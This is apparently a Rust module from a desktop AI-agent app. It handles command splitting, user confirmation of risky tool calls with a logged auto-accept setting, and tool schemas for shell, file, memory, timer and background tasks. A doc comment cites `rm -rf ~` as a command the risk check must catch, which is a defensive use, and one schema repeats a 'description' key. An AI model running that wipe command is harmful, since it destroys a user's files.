use serde_json::{json, Value};
use std::fs;
use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};
use tauri::{AppHandle, Emitter, Manager};

use self::paths::{build_workspace_scoped_shell_code, with_root_header};
use self::risk::{generate_risk_report, score_to_risk_level};
use self::search::{run_integrated_search, SearchOptions, SEARCH_MAX_MATCHES};

mod file_actions;
pub(crate) mod memory;
pub(crate) mod mcp_self;
pub(crate) mod skill_admin;
mod patch;
pub(crate) mod paths;
mod process;
mod risk;
mod search;
pub(crate) mod scripts;
pub(crate) mod serve;
pub(crate) mod timer;
pub(crate) mod todos;
pub(crate) mod background;

// Re-exports for the agent runners (`crate::agents::cli` / `cloud`) and tests.
pub(crate) use self::paths::resolve_safe_path;
pub(crate) use self::process::{decode_process_bytes, OutputDecodeHint};

// Re-exports for the test module below: `mod tests` still reaches the moved
// items through `super::name`, so those names must exist in this namespace.
#[cfg(all(test, windows))]
use self::process::decode_windows_process_bytes_with_code_pages;
#[cfg(test)]
use self::{
    file_actions::build_file_diff,
    patch::apply_unified_patch,
    paths::ensure_mutation_target_allowed,
    risk::{calculate_risk_score, syntax_gate_check, RiskLevel, REJECT_THRESHOLD, RISK_THRESHOLDS},
    search::{contains_ignore_case, SEARCH_MAX_FILE_BYTES},
};

/// Simple command-line splitter that handles single/double quotes and
/// backslash escapes before whitespace/quotes (so `rm\ -rf\ ~` parses as
/// `rm -rf ~` and is caught by the risk assessment). Backslashes before other
/// characters (e.g. `..\..` on Windows) are kept literal.
fn split_command_line(code: &str) -> Vec<String> {
    let mut args: Vec<String> = Vec::new();
    let mut current = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = code.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            '\\' if !in_single => {
                // Backslash escape is only meaningful before whitespace or a
                // quote; otherwise keep it literal (Windows path separators).
                if let Some(&next) = chars.peek() {
                    if next.is_whitespace() || next == '\'' || next == '"' || next == '\\' {
                        chars.next();
                        current.push(next);
                    } else {
                        current.push('\\');
                    }
                } else {
                    current.push('\\');
                }
            }
            '\'' if !in_double => {
                in_single = !in_single;
            }
            '"' if !in_single => {
                in_double = !in_double;
            }
            ' ' | '\t' if !in_single && !in_double => {
                if !current.is_empty() {
                    args.push(current.clone());
                    current.clear();
                }
            }
            _ => {
                current.push(ch);
            }
        }
    }
    if !current.is_empty() {
        args.push(current);
    }
    args
}

pub(crate) async fn request_tool_confirmation(
    app: &AppHandle,
    reason: String,
    cmd_type: String,
    code: String,
    confirm_kind: &'static str,
    requires_auth: &'static str,
    // Cancel flag of the background task this call belongs to. A cancelled
    // task must not keep holding the (serialized) confirmation slot.
    cancel: Option<&std::sync::Arc<std::sync::atomic::AtomicBool>>,
) -> crate::ToolConfirmation {
    use std::sync::atomic::Ordering;

    // `confirm_kind` comes from `RiskLevel::confirm_kind()` and is matched
    // against the kinds the Tools panel persisted in
    // `auto_accept_confirm_kinds` — which may also hold the `"*"` wildcard
    // meaning "every kind". Compare case-insensitively and ignore stray
    // whitespace so hand-edited config.json values still match.
    let auto_accept_enabled = app
        .state::<crate::AppState>()
        .config
        .lock()
        .ok()
        .map(|config| {
            config.auto_accept_confirm_kinds.iter().any(|kind| {
                let kind = kind.trim();
                kind == "*" || kind.eq_ignore_ascii_case(confirm_kind)
            })
        })
        .unwrap_or(false);

    if auto_accept_enabled {
        // Leaves a trace in app.log so "the box is checked but the dialog still
        // pops up" can be diagnosed from the log instead of the source.
        app.state::<crate::AppState>().logger.lock().unwrap().log(
            "INFO",
            &format!(
                "Auto-accepted confirmation (kind: {}, type: {}) via auto_accept_confirm_kinds",
                confirm_kind, cmd_type
            ),
        );

        return crate::ToolConfirmation {
            confirmed: true,
            username: None,
            password: None,
        };
    }

    // `confirm_sender` is a single slot, so two concurrent `execute_tool` calls
    // (main agent + a background task, or two background tasks) would overwrite
    // each other's dialog. Serialize here; the lock is held while the user
    // decides, which is exactly the intended one-at-a-time behaviour.
    let state = app.state::<crate::AppState>();
    let _confirm_guard = state.tool_confirm_lock.lock().await;

    // Unique id ties the frontend's confirm/deny response back to THIS pending
    // request, so a stale response cannot approve a different command.
    let request_id = format!("confirm-{}", uuid::Uuid::new_v4());

    // Register the reply slot *before* emitting, so an immediate click cannot
    // find an empty slot and be dropped.
    let (tx, rx) = tokio::sync::oneshot::channel::<crate::ToolConfirmation>();
    {
        *state.confirm_sender.lock().unwrap() = Some((request_id.clone(), tx));
    }

    let _ = app.emit(
        "confirm-required",
        serde_json::json!({
            "request_id": request_id,
            "reason": reason,
            "cmd_type": cmd_type,
            "code": code,
            "confirm_kind": confirm_kind,
            "requires_auth": requires_auth,
        }),
    );

    let await_reply = async {
        match cancel {
            Some(flag) => {
                tokio::select! {
                    reply = rx => reply.ok(),
                    _ = async {
                        loop {
                            if flag.load(Ordering::SeqCst) {
                                break;
                            }
                            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
                        }
                    } => None,
                }
            }
            None => rx.await.ok(),
        }
    };

    let outcome = tokio::time::timeout(std::time::Duration::from_secs(120), await_reply)
        .await
        .ok()
        .flatten();

    // Drop our own slot entry (timeout / cancellation). A late click then hits
    // an unknown request id and is ignored by `confirm_command`.
    {
        let mut slot = state.confirm_sender.lock().unwrap();
        if matches!(slot.as_ref(), Some((id, _)) if id == &request_id) {
            *slot = None;
        }
    }

    outcome.unwrap_or(crate::ToolConfirmation {
        confirmed: false,
        username: None,
        password: None,
    })
}

/// Hard cap on tool result text fed back into the LLM context. Huge outputs
/// (build logs, large file reads, broad searches) would otherwise flood the
/// context window, force an early compression pass, and invalidate the whole
/// prompt-cache prefix. Head+tail are kept so errors at the end of a log stay
/// visible; the model can always re-read a smaller range.
const TOOL_OUTPUT_HEAD_CHARS: usize = 6_000;
const TOOL_OUTPUT_TAIL_CHARS: usize = 2_000;

pub(crate) fn truncate_tool_output(output: String) -> String {
    let total = output.chars().count();
    let budget = TOOL_OUTPUT_HEAD_CHARS + TOOL_OUTPUT_TAIL_CHARS;
    if total <= budget {
        return output;
    }
    let head: String = output.chars().take(TOOL_OUTPUT_HEAD_CHARS).collect();
    let tail: String = output
        .chars()
        .skip(total - TOOL_OUTPUT_TAIL_CHARS)
        .collect();
    format!(
        "{head}\n\n...[truncated {} of {total} chars — output too large; narrow the command or read a smaller range]...\n\n{tail}",
        total - budget,
    )
}

/// Machine label rendered into the `run_shell` schema (`Windows 11
/// Professional 10.0.22631`, `Mac OS 15.3`, `Ubuntu 24.04`, …), so the model
/// knows which shell language to write without an extra prompt line. Cached
/// because `os_info::get()` probes the OS and the tool payload is rebuilt at
/// every request boundary.
fn machine_label() -> &'static str {
    static LABEL: std::sync::OnceLock<String> = std::sync::OnceLock::new();
    LABEL.get_or_init(|| {
        let info = os_info::get();
        // Windows reports `Type::Windows` + a bare kernel version and keeps
        // the marketing name ("Windows 11 Pro") in `edition`; everywhere else
        // the type already is the name.
        let name = info
            .edition()
            .map(str::to_string)
            .filter(|edition| !edition.trim().is_empty())
            .unwrap_or_else(|| info.os_type().to_string());
        format!("{name} {}", info.version())
    })
}

/// Interpreter every `run_shell` call uses in this build. The desktop platform
/// is known at compile time, so the model never chooses a shell per call:
/// Windows builds run PowerShell (`pwsh`, falling back to Windows PowerShell),
/// Linux/macOS builds run bash.
#[cfg(windows)]
pub(crate) const RUN_SHELL_TYPE: &str = "pwsh";
#[cfg(not(windows))]
pub(crate) const RUN_SHELL_TYPE: &str = "bash";

/// Script language the prompt tells the model to write, matching [`RUN_SHELL_TYPE`].
#[cfg(windows)]
const RUN_SHELL_LANGUAGE: &str = "PowerShell (pwsh)";
#[cfg(not(windows))]
const RUN_SHELL_LANGUAGE: &str = "bash";

/// Build the tool list advertised to the model.
///
/// `self_evolution` adds the dedicated `evolution` memory scope to the memory
/// tool — it only exists while self-evolution mode is on.
pub fn get_all_tools(
    selected_tools: &[String],
    self_evolution: bool,
    background_tools: bool,
) -> Vec<Value> {
    let mut tools = vec![];

    let want_run_cmd = selected_tools.iter().any(|t| t == "run_cmd");
    let want_run_shell = selected_tools.iter().any(|t| t == "run_shell");

    if want_run_cmd {
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "run_cmd",
                "description": "Execute a program or a workspace script with patent-compliant risk assessment. L5/L6 (safe/read-only) run directly; L0-L4 need the user's confirmation with the risk score; syntax errors are rejected with a detailed report. Returns the result or the rejection reason.\n\n`action: \"run\"` (default) runs `command`. The first word is a script name in the library `<workspace>/.data/scripts` (extension optional, e.g. `build-frontend`, `deploy.py`) or a bare program name resolved through PATH (`python`, `git`, `node`); the library is prepended to the child's PATH, so a script wins over a same-named program. Absolute and relative paths are refused — use `run_shell` when a path is really needed.\n\n`action: \"list\"` lists the library with its `@description` / `@usage` header, interpreter and use count, and executes nothing. Scripts are plain files in that folder: write them with `file_actions` and give them `@description` / `@usage` header comments.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["run", "list"],
                            "description": "'run' (default) executes `command`; 'list' returns the workspace script library without running anything."
                        },
                        "command": {
                            "type": "string",
                            "description": "Required for 'run'. Full command line (e.g. 'build-frontend --release', 'python -V', 'curl -s https://example.com'): the first word is a library script name or a bare PATH program, the rest are arguments."
                        },
                        "timeout_seconds": {
                            "type": "integer",
                            "minimum": 1,
                            "maximum": 3600,
                            "description": "Optional timeout in seconds. Defaults to 30."
                        }
                    },
                    "required": ["action"]
                }
            }
        }));
    }

    if want_run_shell {
        // The OS label and the fixed script language live in the tool schema:
        // the model only needs to know which language to write, never which
        // interpreter to run (that is compiled in with the desktop platform).
        let machine = machine_label();
        let language = RUN_SHELL_LANGUAGE;
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "run_shell",
                "description": format!(
                    "Execute or manage a shell script under the same risk assessment and confirmation rules as `run_cmd`.\n\n\
                     This machine runs {machine}. The shell is fixed for this build: write {language} scripts (there is no shell-type argument to choose).\n\n\
                     The script starts in the working directory (the workspace root for the main chat, the task directory inside a sub-agent mission) but may `cd` and run anything — pipes, loops, redirections, absolute paths. Use it when a PATH-resolved program is not enough.\n\n\
                     `run_type: \"direct\"` (default) runs to completion and returns the output. `run_type: \"serve\"` starts a long-lived child (HTTP service, watcher…) and returns a `serve_id`; then `action: \"list\"` shows the processes and `action: \"stop\"` kills one id (or `serve_id: \"all\"`). Serve processes die with this chat turn and at app exit."
                ),
                "parameters": {
                    "type": "object",
                    "properties": {
                        "run_type": {
                            "type": "string",
                            "enum": ["direct", "serve"],
                            "description": "'direct' (default) waits for the script and returns its output; 'serve' starts it as a long-lived background process and returns a serve id immediately."
                        },
                        "action": {
                            "type": "string",
                            "enum": ["start", "stop", "list"],
                            "description": "Only with run_type 'serve': 'start' (default), 'stop' (kills the process named by serve_id), 'list' (known serve processes with recent output)."
                        },
                        "serve_id": {
                            "type": "string",
                            "description": "Serve id returned by a `run_type: \"serve\"` start (required for 'stop'). Use 'all' to stop every serve process."
                        },
                        "code": {
                            "type": "string",
                            "description": "The shell script body. Required for run_type 'direct' and serve 'start'; not needed for 'stop'/'list'."
                        },
                        "sudo": {
                            "type": "boolean",
                            "description": "If true (bash only), run the whole script through sudo. Asks for confirmation and sudo credentials."
                        },
                        "elevated": {
                            "type": "boolean",
                            "description": "If true (PowerShell only), request administrator elevation (UAC). Asks for confirmation."
                        },
                        "timeout_seconds": {
                            "type": "integer",
                            "minimum": 1,
                            "maximum": 3600,
                            "description": "Optional timeout for run_type 'direct', in seconds (default 30). Ignored for serve processes, which run until stopped, the turn ends or the app exits."
                        }
                    }
                }
            }
        }));
    }

    if selected_tools.iter().any(|t| t == "file_actions") {
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "file_actions",
                "description": "File operations strictly inside the workspace. Use `./...` paths (e.g. `./src/App.tsx`) or `.` for the root; absolute paths inside the workspace work, anything resolving outside is rejected — use `run_shell` only when external access is genuinely required. `.data` is part of the workspace and writable: skills under `./.data/skills/...`, the `run_cmd` script library under `./.data/scripts/...`, memory/todos/status — everything except `.data/chat.db`. Temporary and scratch output belongs in `./.data/tmp/` (the shared workspace tmp area: sub-agent deliverables, the PDF cache and composer pastes live there; every plain file sitting directly in it expires after a day, so long-lived output belongs in a subdirectory). Protected self-evolution targets get an automatic `.bak.<n>` backup before mutation.",
                "description": "File operations strictly inside the workspace. Use `./...` paths (e.g. `./src/App.tsx`) or `.` for the root; absolute paths inside the workspace work, anything resolving outside is rejected — use `run_shell` only when external access is genuinely required. `.data` is part of the workspace and writable: skills under `./.data/skills/...`, the `run_cmd` script library under `./.data/scripts/...`, memory/todos/status — everything except `.data/chat.db`. Temporary and scratch output belongs in `./.data/tmp/` (the shared workspace tmp area: sub-agent deliverables, the PDF cache and composer pastes live there; every plain file sitting directly in it expires after a day, so long-lived output belongs in a subdirectory). An `@path` mention in a user message was already inlined at send time — the `<details><summary>Attached File: … — already provided below` block holds those bytes — so read the file only for the parts that are missing (other lines, other files), never to re-check what the user already sent. Protected self-evolution targets get an automatic `.bak.<n>` backup before mutation.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["read", "write", "list", "search", "mkdir", "patch", "diff", "rename", "move", "delete"],
                            "description": "read file content, write/overwrite a file, list a directory, search file contents, create directories recursively, apply a unified diff patch (hunks are located by content — `@@` numbers are hints), diff two files, rename, move, delete."
                        },
                        "path": {
                            "type": "string",
                            "description": "Workspace-relative path, e.g. `./src/App.tsx`, or `.`/`./` for the root when listing or searching. Paths outside the workspace are refused."
                        },
                        "new_path": {
                            "type": "string",
                            "description": "Destination path for 'rename'; for 'diff' the second file to compare `path` against."
                        },
                        "start_line": {
                            "type": "integer",
                            "minimum": 1,
                            "description": "First line to read (1-based, inclusive; 'read' only)."
                        },
                        "end_line": {
                            "type": "integer",
                            "minimum": 1,
                            "description": "Last line to read (1-based, inclusive; 'read' only)."
                        },
                        "content": {
                            "type": "string",
                            "description": "Content to write ('write' only)."
                        },
                        "query": {
                            "type": "string",
                            "description": "Search text or regex pattern ('search' only). No external rg executable is needed."
                        },
                        "recursive": {
                            "type": "boolean",
                            "description": "Recurse into subdirectories when `path` is a directory ('search', default true)."
                        },
                        "case_sensitive": {
                            "type": "boolean",
                            "description": "Case-sensitive content search ('search', default false)."
                        },
                        "smart_case": {
                            "type": "boolean",
                            "description": "Uppercase letters in `query` switch to case-sensitive when case_sensitive is false ('search', default false)."
                        },
                        "use_regex": {
                            "type": "boolean",
                            "description": "Treat `query` as a regular expression instead of plain text ('search', default false)."
                        },
                        "glob": {
                            "type": "string",
                            "description": "Path glob filter for search targets, e.g. '**/*.rs' ('search' only)."
                        },
                        "include_hidden": {
                            "type": "boolean",
                            "description": "Include hidden files and directories in directory searches ('search', default true)."
                        },
                        "respect_gitignore": {
                            "type": "boolean",
                            "description": "Respect .gitignore/.ignore/git-exclude rules ('search', default false). Set true on large trees — skipping node_modules/, target/ etc. is the biggest speedup."
                        },
                        "max_results": {
                            "type": "integer",
                            "minimum": 1,
                            "maximum": 20000,
                            "description": "Max matching lines to return ('search', default 1000). The parallel search stops early once the budget is spent, so a broad query degrades to a fast prefix."
                        },
                        "patch": {
                            "type": "string",
                            "description": "Unified diff to apply ('patch' only). Hunks are located by CONTENT, not line numbers, so stale numbers are tolerated — but context and changed lines must be real copies of the file.\n\nFormat (both header parts optional):\n@@ -<old_line>,<count> +<new_line>,<count> @@\n <unchanged context line>\n-<removed line>\n+<added line>\n <unchanged context line>\n\nTo apply on the first try: (1) read the file first and copy every context/removed/added line character-for-character — keep the leading space of context lines and the file's exact indentation, never retype or re-wrap; (2) give 3 unchanged context lines above and below each change (more when the text repeats); (3) copy line numbers from the read output when possible — they are hints, content decides; (4) one hunk per separated change, in file order, never merge distant edits. `---`/`+++`/`diff --git` headers are optional and ignored, LF and CRLF both work, `\\ No newline at end of file` is understood. Matching tolerates leading/trailing whitespace only; on failure the error shows the closest actual content — re-read, fix the context and retry, or use action 'write' for large rewrites."
                        },
                        "context_lines": {
                            "type": "integer",
                            "minimum": 0,
                            "maximum": 20,
                            "description": "Unchanged context lines shown around each change in a 'diff' result (default 3)."
                        },
                        "ignore_whitespace": {
                            "type": "boolean",
                            "description": "Ignore leading/trailing and repeated whitespace inside lines when diffing ('diff', default false)."
                        }
                    },
                    "required": ["action", "path"]
                }
            }
        }));
    }

    if selected_tools.iter().any(|t| t == "memory") {
        let evolution_scope = if self_evolution {
            "\n- `evolution`: file-backed self-evolution area — verified facts that must survive across sessions (default interpreter and runtime environment, correct tool usage, frequent file locations). Search it when a problem needs earlier experience."
        } else {
            ""
        };
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "memory",
                "description": format!("Manage persistent memory in these scopes:\n- `session`: in-memory, cleared at app restart — task context and in-progress notes.\n- `user`: file-backed, cross-session — preferences, patterns, general insights.\n- `repo`: file-backed, repository-scoped — conventions, build commands, project facts.{evolution_scope}\n\n`scope: \"all\"` runs get/list/search over every scope at once (read-only); add/delete need one concrete scope. `user`/`repo` are markdown files in the workspace `.data/memory` (app-managed — never edit them with file tools). Nothing is preloaded into the prompt: you look memory up yourself. Evolution entries are structured (key, title, kind, tags, importance, evidence) and ranked by experience, so a search returns the most useful entries first — keep each to one dense fact. `consolidate` folds a large evolution cluster into a skill archive: `phase: \"plan\"` first, then `phase: \"apply\"` with the full `skill_md` and the same `keys`."),
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": if self_evolution {
                                json!(["add", "get", "list", "search", "delete", "consolidate"])
                            } else {
                                json!(["add", "get", "list", "search", "delete"])
                            },
                            "description": "'add' stores or updates an entry, 'get' fetches by key, 'list' lists entries (ranked), 'search' finds by content, 'delete' removes one, 'consolidate' folds a large evolution cluster into a skill archive."
                        },
                        "scope": {
                            "type": "string",
                            "enum": if self_evolution {
                                json!(["session", "user", "repo", "evolution", "all"])
                            } else {
                                json!(["session", "user", "repo", "all"])
                            },
                            "description": if self_evolution {
                                "Memory scope: 'session' is in-memory only (cleared on restart); 'user', 'repo' and 'evolution' are file-backed and persist — 'evolution' holds verified reusable facts; 'all' runs get/list/search over every scope (read-only). Defaults to 'session'."
                            } else {
                                "Memory scope: 'session' is in-memory only (cleared on restart); 'user' and 'repo' are file-backed and persist; 'all' runs get/list/search over every scope (read-only). Defaults to 'session'."
                            }
                        },
                        "key": {
                            "type": "string",
                            "description": "Unique key (required for add/get/delete); a short descriptive slug like 'api-keys'. Re-adding the same key updates the entry and raises its evidence count."
                        },
                        "content": {
                            "type": "string",
                            "description": "The fact (required for 'add'). Markdown is allowed; for evolution keep it to one dense sentence — never a whole conversation or answer."
                        },
                        "title": {
                            "type": "string",
                            "description": "Evolution: one-line title for compact rendering (max ~100 chars)."
                        },
                        "kind": {
                            "type": "string",
                            "enum": ["fact", "recipe", "location", "pitfall"],
                            "description": "Evolution: category of the entry; a cluster is grouped by kind when archived into a skill."
                        },
                        "importance": {
                            "type": "integer",
                            "minimum": 1,
                            "maximum": 5,
                            "description": "Evolution: 1-5; 5 (or pinned) always survives the prompt budget — reserve it for cross-project environment facts."
                        },
                        "pinned": {
                            "type": "boolean",
                            "description": "Evolution: always inject this entry, regardless of ranking."
                        },
                        "merge": {
                            "type": "boolean",
                            "description": "Evolution: merge into a similar existing entry instead of creating a second file (default true)."
                        },
                        "tags": {
                            "type": "array",
                            "items": { "type": "string" },
                            "description": "Optional tags ('add' only)."
                        },
                        "query": {
                            "type": "string",
                            "description": "Search text (required for 'search'); matches keys and content."
                        },
                        "phase": {
                            "type": "string",
                            "enum": ["plan", "apply", "restore", "list"],
                            "description": "'plan' lists the large clusters (start here); 'apply' writes the skill and archives its keys; 'restore' moves archived entries back; 'list' shows archived skills."
                        },
                        "keys": {
                            "type": "array",
                            "items": { "type": "string" },
                            "description": "apply: the evolution keys being archived — verbatim from the plan; each must also appear in the skill's `source-memory` front matter."
                        },
                        "skill_md": {
                            "type": "string",
                            "description": "apply: the complete skill document (YAML frontmatter with name, description, source-memory, then the grouped runbook body)."
                        },
                        "skill": {
                            "type": "string",
                            "description": "restore: the skill whose archived entries move back."
                        }
                    },
                    "required": ["action"]
                }
            }
        }));
    }

    if selected_tools
        .iter()
        .any(|t| t == "todo_list" || t == "todo")
    {
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "todos",
                "description": "Manage this session's todo list (the `file_actions` counterpart for plans). Call 'list' first — the list is long-running session state shared with every parallel agent and the UI mirrors every change live. 'add' appends an item, 'update_status' moves one through pending → in_progress → completed/cancelled, 'clear_completed' removes finished items, 'archive' starts a fresh list.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["list", "add", "update_status", "clear_completed", "archive"],
                            "description": "list / add / update one item's status / clear finished items / archive the active list."
                        },
                        "title": {
                            "type": "string",
                            "description": "Short, action-oriented title (required for 'add')."
                        },
                        "description": {
                            "type": "string",
                            "description": "Optional longer description with acceptance criteria ('add' only)."
                        },
                        "todo_id": {
                            "type": "string",
                            "description": "Id to update ('update_status' only) — copy it from a 'list' result, never invent one."
                        },
                        "status": {
                            "type": "string",
                            "enum": ["pending", "in_progress", "completed", "cancelled"],
                            "description": "New status ('update_status' only)."
                        },
                        "new_title": {
                            "type": "string",
                            "description": "Optional title for the list that follows the archive ('archive' only). Defaults to 'Working plan'."
                        }
                    },
                    "required": ["action"]
                }
            }
        }));
    }

    if selected_tools.iter().any(|t| t == "timer") {
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "timer_set",
                "description": "Schedule a one-shot delay timer that resumes this conversation later (see the TIMER policy). Start the slow work first, then arm the timer, tell the user and END YOUR TURN: the app injects `message` into this chat as a new user turn, with the full history.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "delay_seconds": {
                            "type": "integer",
                            "minimum": 1,
                            "maximum": 2592000,
                            "description": "How long to wait before resuming, in seconds (1800 = 30 minutes). Maximum 2592000 (30 days)."
                        },
                        "message": {
                            "type": "string",
                            "description": "Self-contained prompt for the future turn: what to do, what to check, where the output lives — it is the only thing that turn knows besides the history."
                        },
                        "label": {
                            "type": "string",
                            "description": "Short label shown in the timer bar, e.g. 'collect logs'."
                        }
                    },
                    "required": ["delay_seconds", "message"]
                }
            }
        }));
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "timer_list",
                "description": "List pending timers (id, label, fire time, remaining seconds, message) — check before arming a duplicate, or to find a timer id to cancel.",
                "parameters": {
                    "type": "object",
                    "properties": {}
                }
            }
        }));
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "timer_cancel",
                "description": "Cancel a pending timer so it never resumes the conversation.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "timer_id": {
                            "type": "string",
                            "description": "Id from timer_set or timer_list."
                        }
                    },
                    "required": ["timer_id"]
                }
            }
        }));
    }

    // ── Background execution ────────────────────────────────────────────────
    // Only the long-running, read-mostly tools accept the flag: a background
    // mutation could race an unrelated edit the model starts while it waits.
    // The control tool is advertised whenever the feature is on — MCP tools and
    // sub-agents can be backgrounded even when none of the local tools is
    // selected.
    if background_tools {
        for tool in tools.iter_mut() {
            let name = tool["function"]["name"].as_str().unwrap_or("");
            if matches!(name, "run_cmd" | "run_shell" | "file_actions") {
                tool["function"]["parameters"]["properties"]["run_in_background"] = json!({
                    "type": "boolean",
                    "description": "Run as a background task: return a task id immediately instead of blocking the turn. The result arrives automatically before your next request and the turn stays open until it does. Use it for slow work (large searches, builds, long commands) you can do something else meanwhile — not for a quick command, and never start one and then finish without `background_task` action `wait`."
                });
            }
        }
        tools.push(json!({
            "type": "function",
            "function": {
                "name": "background_task",
                "description": "Manage background tasks started with `run_in_background`:\n- `list`: running and finished tasks of this session (id, tool, status, elapsed).\n- `wait`: block until the given tasks (or every task) finish, up to `timeout_seconds`; returns the results that became available.\n- `get`: full result of one finished task.\n- `cancel`: stop a task (or all) — the process tree is killed and the result discarded.\n\nA finished task's result is also delivered automatically before your next request, so `wait` is only needed when you cannot proceed without it.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["list", "wait", "get", "cancel"],
                            "description": "The management action to perform."
                        },
                        "task_id": {
                            "type": "string",
                            "description": "Single task id (`get` / `cancel`). Use `\"all\"` with `cancel` to stop every task of this session."
                        },
                        "task_ids": {
                            "type": "array",
                            "items": { "type": "string" },
                            "description": "Task ids to wait for (`wait`); omit to wait for every task of this session."
                        },
                        "timeout_seconds": {
                            "type": "integer",
                            "minimum": 1,
                            "maximum": 300,
                            "description": "Maximum wait in seconds (default 60)."
                        }
                    },
                    "required": ["action"]
                }
            }
        }));
    }

    // Self-evolution mode owns a second capability besides skills and memory:
    // the assistant may build and run its own MCP servers (`mcp_self`). The
    // tool is not part of `selected_tools` — the mode is the switch, exactly
    // like `skill_read` / `use_skill` are injected from the session state. It
    // is filtered back out for sub-agents and the main-agent helper, which must
    // not race on the registry (see `agents::SUB_AGENT_EXCLUDED_TOOLS`).
    if self_evolution {
        tools.push(self::mcp_self::schema());
    }

    tools
}

/// Build the `skill_read` tool definition.
/// This tool is auto-injected when one or more skills are active in the session.
pub fn get_skill_read_tool() -> Value {
    json!({
        "type": "function",
        "function": {
            "name": "skill_read",
            "description": "Read, list or search files inside an active skill's directory — supplementary material (templates, configs, data, examples) that accompanies its SKILL.md. Paths are relative to the skill root.",
            "parameters": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["read", "list", "search"],
                        "description": "read file content, list directory entries, or search file contents."
                    },
                    "skill_name": {
                        "type": "string",
                        "description": "Name of the active skill whose directory to access."
                    },
                    "path": {
                        "type": "string",
                        "description": "Path relative to the skill root; '.' (the default) is the root itself."
                    },
                    "start_line": {
                        "type": "integer",
                        "minimum": 1,
                        "description": "First line to read (1-based, inclusive)."
                    },
                    "end_line": {
                        "type": "integer",
                        "minimum": 1,
                        "description": "Last line to read (1-based, inclusive)."
                    },
                    "query": {
                        "type": "string",
                        "description": "Search text or regex pattern ('search')."
                    },
                    "recursive": {
                        "type": "boolean",
                        "description": "Recurse into subdirectories ('search', default true)."
                    },
                    "case_sensitive": {
                        "type": "boolean",
                        "description": "Case-sensitive search ('search', default false)."
                    },
                    "use_regex": {
                        "type": "boolean",
                        "description": "Treat `query` as a regular expression ('search', default false)."
                    },
                    "glob": {
                        "type": "string",
                        "description": "Path glob filter, e.g. '**/*.md' ('search')."
                    },
                    "max_results": {
                        "type": "integer",
                        "minimum": 1,
                        "maximum": 20000,
                        "description": "Max matching lines to return ('search', default 1000)."
                    }
                },
                "required": ["action", "skill_name"]
            }
        }
    })
}

/// Build the `use_skill` tool definition. Advertised to the main chat (when the
/// session has enabled skills) and to the main-agent helper, so both load skill
/// bodies with the same protocol.
pub fn get_use_skill_tool() -> Value {
    json!({
        "type": "function",
        "function": {
            "name": "use_skill",
            "description": "Load detailed instructions for a specific skill. Call this only when the current request clearly requires that skill's domain knowledge or files. Do not load skills speculatively.",
            "parameters": {
                "type": "object",
                "properties": {
                    "skill_name": { "type": "string", "description": "The name of the skill to load details for" }
                },
                "required": ["skill_name"]
            }
        }
    })
}

/// Build the `ask_main_agent` tool definition. Only `llm` sub-agents receive
/// this tool (and only while `config.sub_agent_main_help` is on): it hands a
/// self-contained material request to a helper run that has the main model,
/// conversation history, skills, MCP servers and the full main tool set.
pub fn get_main_agent_help_tool() -> Value {
    json!({
        "type": "function",
        "function": {
            "name": "ask_main_agent",
            "description": "Ask the main agent to collect material you cannot obtain yourself (conversation context, skills, enabled MCP servers, browser/network access, or extra tools). Use this immediately when the task needs live web/browser/API data or a tool that is not in your tool list — do not burn rounds scanning local snapshots for a missing data channel. The main agent sees the real conversation history and returns concrete material; you continue your task with the result.",
            "parameters": {
                "type": "object",
                "properties": {
                    "request": {
                        "type": "string",
                        "description": "Exactly what you need the main agent to find or clarify. Be specific (paths, names, questions)."
                    },
                    "context": {
                        "type": "string",
                        "description": "Optional: why you need it and what you already tried, so the main agent does not repeat your work."
                    }
                },
                "required": ["request"]
            }
        }
    })
}

pub fn get_agent_task_tools() -> Vec<Value> {
    vec![
        json!({
            "type": "function",
            "function": {
                "name": "add_task",
                "description": "Add a new task to the current autonomous mission. Use this instead of relying on chat history to remember future work.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "name": {
                            "type": "string",
                            "description": "Short task title"
                        },
                        "description": {
                            "type": "string",
                            "description": "Detailed task description"
                        }
                    },
                    "required": ["description"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "update_task_status",
                "description": "Update the status of an existing mission task.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "task_id": {
                            "type": "string",
                            "description": "Mission task identifier"
                        },
                        "status": {
                            "type": "string",
                            "enum": ["pending", "in_progress", "completed"],
                            "description": "New task status"
                        }
                    },
                    "required": ["task_id", "status"]
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "get_active_tasks",
                "description": "Return all active mission tasks that are not completed.",
                "parameters": {
                    "type": "object",
                    "properties": {}
                }
            }
        }),
        json!({
            "type": "function",
            "function": {
                "name": "mark_mission_accomplished",
                "description": "Mark the current mission as accomplished so the autonomous loop can terminate cleanly.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "final_report": {
                            "type": "string",
                            "description": "Optional final report to persist as the mission outcome"
                        }
                    }
                }
            }
        }),
    ]
}

#[cfg(test)]
mod tests {
    use super::contains_ignore_case;
    use super::decode_process_bytes;
    #[cfg(windows)]
    use super::decode_windows_process_bytes_with_code_pages;
    use super::ensure_mutation_target_allowed;
    use super::run_integrated_search;
    use super::OutputDecodeHint;
    use super::SearchOptions;
    use super::SEARCH_MAX_FILE_BYTES;
    use std::fs;
    use std::path::PathBuf;
